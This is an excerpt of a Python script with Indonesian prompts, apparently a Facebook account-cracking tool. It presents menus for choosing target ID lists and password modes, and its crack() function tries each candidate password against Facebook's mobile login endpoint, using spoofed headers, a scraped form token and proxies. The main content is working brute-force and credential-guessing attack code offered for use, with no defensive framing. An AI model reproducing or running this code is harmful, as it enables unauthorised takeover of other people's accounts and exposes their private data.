...
def setting():
	#print("")
	print(' ᄂ Ingin Menampilkan aplikasi di akun ok Y/T ? ')
	aplik = input('Choose : ')
	if aplik in ['y','Y']:
		taplikasi.append('y')
		urut()
...
def urut():
	#info()
	#print(47*"•")
    print(f'\t{P}1. {M}Start with Old ID')
    print(f'\t{P}2. {H}Start with New ID')
    print(f'\t{P}3. {K}Start with Random ID ')
    ...
    if hc in ['1','01']:
        ...
        method.append('mobile')
    ch = input(f'{P} ingin memakai pasword manual? {P}({H}Y{P}/{K}T{P})?: ')
    if ch in ['y','Y']:gabung()
    elif ch in ['t','T']:otomatis()
    else:otomatis()
...
def crack(idf,pwv,url):
	...
	for pw in pwv:
		try:
			...
			head = {"Host": url, "content-length": f"{len(str(date))}", "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link)).group(1), "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": f"https://{url}", "x-requested-with": "com.microsoft.bing", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": f"https://{url}/login.php?skip_api_login=1&api_key=966242223397117&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fabout.fb.com%252Fnews%252F2022%252F10%252Fprotecting-people-on-instagram-from-abuse%252F%26src%3Dsdkpreparse&cancel=https%3A%2F%2Fm.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&display=touch&locale=id_ID&_rdr", "accept-encoding": "gzip, deflate","accept-language": "af_AF,fr;q=0.9,en-US;q=0.8,en;q=0.7"}
			bz = ses.post(f"https://{url}/login/device-based/login/async/login.php?skip_api_login=1&api_key=966242223397117&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fabout.fb.com%252Fnews%252F2022%252F10%252Fprotecting-people-on-instagram-from-abuse%252F%26src%3Dsdkpreparse&cancel=https%3A%2F%2Fm.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&lwv=100&locale2=id_ID&refid=9",data=date, headers=head,proxies=proxy)
